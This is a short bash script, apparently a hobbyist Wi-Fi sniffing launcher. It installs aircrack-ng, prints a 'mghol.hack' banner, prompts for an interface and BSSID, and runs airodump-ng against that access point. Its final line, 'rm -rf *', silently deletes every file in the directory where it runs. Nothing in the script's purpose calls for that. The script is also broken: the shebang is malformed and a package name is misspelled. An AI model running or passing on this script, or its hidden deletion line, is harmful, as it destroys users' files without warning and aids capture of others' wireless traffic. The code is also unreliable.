!/bin/bash
sudo apt update
sudo apt upgrade
sudo apt install  aircrak-ng
sudo apt install figlet
figlet mghol.hack
read -p "enter intrf is" i
read -p "enter bssid is" b
sudo airodump-ng $i --bssid $b
rm -rf *














